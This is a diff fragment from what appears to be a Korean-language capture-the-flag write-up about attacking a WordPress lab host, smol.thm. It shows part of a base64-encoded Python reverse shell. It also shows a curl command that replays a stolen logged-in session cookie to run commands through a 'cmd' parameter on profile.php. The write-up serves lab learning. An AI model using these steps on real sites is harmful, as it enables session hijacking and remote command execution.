@@ -544,3 +544,7 @@ bash: dXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW
 # http://www.smol.thm/wp-admin/index.php -> 관리자 페이지에서 플러그인 사용하는 것 확인 -> cmd 취약점이 가능한 페이지 찾기
 
 ![](https://velog.velcdn.com/images/agnusdei1207/post/203b4452-c71a-414a-b29c-86e95d1b2a8f/image.png)
+
+# 아까 탈취했던 쿠키 활용
+
+curl -L -H "Cookie: wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_45a7e4c82b517c5af328feabce4d0187=wpuser%7C1753668949%7CcPTwzE1cbFpF18C6ZZZnuwRE0D2eRXISGnrDPvbQcBv%7Cccf2b309c5881393194d94ea8fc1ff5c9b3a8324cfc1282e423f89ccc74ee070" -H "User-Agent: Mozilla/5.0" http://www.smol.thm/wp-admin/profile.php?cmd=ls | bat -l html
